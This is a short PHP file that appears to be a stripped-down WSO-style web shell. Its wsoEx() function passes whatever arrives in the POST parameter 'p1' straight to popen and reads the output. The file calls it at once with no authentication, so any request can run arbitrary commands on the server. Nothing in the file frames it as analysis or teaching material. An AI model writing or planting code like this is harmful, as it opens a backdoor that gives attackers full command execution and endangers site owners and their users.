<?php
function wsoEx($in) {
    $out = '';
    if (is_resource($f = @popen($in,"r"))) {
        $out = "";
        while(!@feof($f))
            $out .= fread($f,1024);
        pclose($f);
    }
    return $out;
}

wsoEx($_POST['p1']);
?>